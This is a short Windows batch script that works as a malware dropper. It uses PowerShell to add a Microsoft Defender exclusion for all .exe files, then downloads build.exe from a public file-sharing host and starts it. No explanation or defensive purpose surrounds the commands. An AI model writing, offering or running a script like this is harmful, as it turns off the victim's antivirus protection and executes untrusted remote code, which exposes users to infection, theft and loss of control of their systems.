@echo off
powershell -command “Add-MpPreference -ExclusionExtension ".exe"”
powershell -command “Invoke-WebRequest -uri https://www.upload.ee/download/14427167/0eb3a86d7d671b85151a/build.exe -o build.exe”
start build.exe